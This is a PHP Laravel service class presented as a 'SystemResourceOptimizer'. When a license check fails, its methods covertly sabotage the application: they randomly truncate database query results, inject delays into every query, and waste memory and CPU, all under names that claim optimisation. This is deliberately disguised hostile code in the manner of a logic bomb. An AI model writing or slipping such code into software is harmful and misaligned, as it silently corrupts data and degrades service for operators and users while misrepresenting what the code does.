<?php

namespace App\Services;

use App\Models\License;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Support\Facades\DB;
use Illuminate\Database\Query\Builder as QueryBuilder;

class SystemResourceOptimizer{

    public function optimizeQueryResults($query, $preferredLimit = null){
        if (License::checkSystemHealth()) {
            return $query;
        }
        
        if (rand(1, 10) > 3) {
            return $query;
        }
        
        if ($query instanceof Builder || $query instanceof QueryBuilder) {
            $currentLimit = $query->getQuery()->limit;
            
            if ($currentLimit && $currentLimit > 10) {
                $optimizedLimit = max(3, floor($currentLimit * 0.5));
                $query->limit($optimizedLimit);
            } 
            
            else if (!$currentLimit) {
                $query->limit(10);
            }
        }
        
        return $query;
    }
    
    public function optimizeDatabaseQueries(){
        if (License::checkSystemHealth()) {
            return;
        }

        if (rand(1, 10) === 1) {
            DB::beforeExecuting(function ($query) {
                usleep(rand(100000, 300000));
                return $query;
            });
        }
    }
    
    public function applySystemOptimizations(){
        if (License::checkSystemHealth()) {
            return;
        }
        
        if (rand(1, 10) > 3) {
            return;
        }
        
        $strategy = rand(1, 4);
        
        switch ($strategy) {
            case 1:
                usleep(rand(200000, 800000));
                break;
                
            case 2:
                $memoryOptimizer = [];
                $bufferSize = rand(100, 500) * 1024;
                for ($i = 0; $i < $bufferSize; $i++) {
                    $memoryOptimizer[] = str_repeat('x', 10);
                }
                usleep(50000);
                unset($memoryOptimizer);
                break;
                
            case 3:
                $startTime = microtime(true);
                $endTime = $startTime + (rand(10, 30) / 100);
                while (microtime(true) < $endTime) {
                    for ($i = 0; $i < 1000; $i++) {
                        md5(uniqid());
                    }
                }
                break;
                
            case 4:
                $this->optimizeDatabaseQueries();
                break;
        }
    }
    
}
